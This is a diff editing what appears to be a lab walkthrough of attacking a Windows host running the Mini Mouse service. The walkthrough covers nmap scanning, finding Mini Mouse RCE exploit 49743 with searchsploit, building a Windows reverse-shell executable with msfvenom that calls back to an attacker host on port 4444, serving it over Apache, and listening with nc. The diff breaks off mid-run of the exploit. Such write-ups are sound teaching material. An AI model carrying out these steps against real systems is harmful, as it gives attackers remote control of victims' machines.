@@ -7,7 +7,7 @@
 # 1. nmap scan
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ nmap -p- -A 10.0.88.33
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 10:40 +08
 Nmap scan report for 10.0.88.33
@@ -88,7 +88,7 @@ Searching for the `Server: bruce_wy/1.0.0` information on google leads us to a [
 Path traversal isn't exactly useful, let's search if there are more `mini mouse` exploits
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ searchsploit mini mouse
 -------------------------------------------- ---------------------------------
  Exploit Title                              |  Path
@@ -102,12 +102,14 @@ Shellcodes: No Results
 
 The RCE exploit looks interesting, let's try that
 
+☝️ A faster method is to google for `8039 site:www.exploit-db.com`, which will also return the Mini Mouse RCE exploit as a result
+
 # 3. Targeting the Mini Mouse service
 
 Aanalyzing the exploit code shows that it executes a selected payload:
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ searchsploit -m 49743
   Exploit: Mini Mouse 9.2.0 - Remote Code Execution
       URL: https://www.exploit-db.com/exploits/49743
@@ -116,7 +118,7 @@ File Type: Python script, ASCII text executable
 
 Copied to: /home/kali/49743.py
 
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ cat 49743.py
 ⋮
 ip = input("target's ip:  ")
@@ -130,25 +132,22 @@ url = "http://{}:8039/op=command".format(ip)
 
 Generate reverse shell executable and setup web server endpoint on Kali:
 
+(Apache2 is already running with DocumentRoot at `/var/www/html`
+
 ```console
-┌──(kali㉿kali)-[~]
-└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o reverse.exe
+┌──(root㉿kali)-[~]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of exe file: 7168 bytes
-Saved as: reverse.exe
-
-┌──(kali㉿kali)-[~]
-└─$ sudo python3 -m http.server 80 &> /dev/null &
-[1] 2111
-```
+Saved as: /var/www/html/reverse.exe
 
 Open another console window on Kali to listen for connections:
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
 ```
@@ -156,14 +155,14 @@ listening on [any] 4444 ...
 Run the exploit and get our shell:
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ python3 49743.py
 Traceback (most recent call last):
   File "/home/kali/49743.py", line 12, in <module>
     import jsonargparse
 ModuleNotFoundError: No module named 'jsonargparse'
 
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ pip install jsonargparse
 Defaulting to user installation because normal site-packages is not writeable
 Collecting jsonargparse
@@ -173,7 +172,7 @@ Requirement already satisfied: PyYAML>=3.13 in /usr/lib/python3/dist-packages (f
 Installing collected packages: jsonargparse
 Successfully installed jsonargparse-4.17.0
 
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ python3 49743.py
 target's ip:  10.0.88.33
 local http server ip: kali.vx
